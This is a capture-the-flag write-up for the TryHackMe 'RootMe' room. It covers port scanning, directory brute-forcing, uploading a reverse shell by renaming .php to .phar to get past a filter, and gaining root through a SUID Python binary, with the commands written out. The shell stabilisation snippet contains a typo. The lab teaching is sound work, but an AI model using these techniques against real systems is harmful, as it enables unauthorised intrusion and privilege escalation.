```bash
# PLATFORM          . THM
# CTF NAME          . RootMe
# DESCRIPTION       . A ctf for beginners, can you root me?
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/rrootme
```

```bash
sudo nmap -sSVC -T5 10.10.170.43 -p- -oN ~/workspace/ctf_workspace/rootme
```

```
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4ab9160884c25448ba5cfd3f225f2214 (RSA)
|   256 a9a686e8ec96c3f003cd16d54973d082 (ECDSA)
|_  256 22f6b5a654d9787c26035a95f3f9dfcd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackIT - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

- While the nmap scan was looking, I took checked to see if there's a webserver running on port 80; 

- I thought that it might reveal useful information if I bruteforce a bit for endpoints since there were not any particular useful information on the `index.html` page.

```bash
ffuf -u http://10.10.170.43/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt  -t 100
```

```
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 616, Words: 115, Lines: 26]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10]
panel                   [Status: 301, Size: 312, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
uploads                 [Status: 301, Size: 314, Words: 20, Lines: 10]
```

- There was nothing in `uploads`, but `panel` provided an upload form.

- I tried uploading [Pentestmonkey's PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell), but `.php` was filtered.

- I managed to bypass that filter by changing the extension from `.php` to `.phar`. 

- We got a reverse shell as `www-data` and this is enough to grab the first flag from `/var/www`

- Then, I've stabilized the shell and started looking for privilege escalation vectors.

```stabilisation
python3 -c 'import pty;.pty.spawn("/bin/bash")'
export TERM=xterm
<CTRL+Z>
stty raw -echo; fg
```

- While I was manually enumerating the system for possible escalation paths, I've checked for any SUID-set binaries.

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

```
-rwsr-sr-x   1 root     root        3665768 Aug  4  2020 /usr/bin/python
```

- Python showed up - and this is not common, so I've checked it against [GTFObins](https://gtfobins.github.io/) for possible escalation.

```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```sh
# whoami
root
```

- The last flag was found in `/root/root.txt`.

